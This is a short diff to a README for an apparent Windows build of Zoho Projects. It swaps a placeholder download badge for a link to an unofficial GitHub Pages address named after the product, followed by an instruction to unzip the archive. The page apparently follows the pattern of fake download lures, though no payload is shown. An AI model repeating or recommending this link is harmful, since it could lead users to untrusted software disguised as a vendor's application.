@@ -6,7 +6,7 @@ Zoho Projects for Windows provides an all-in-one platform for planning projects,
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://zoho-projects-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
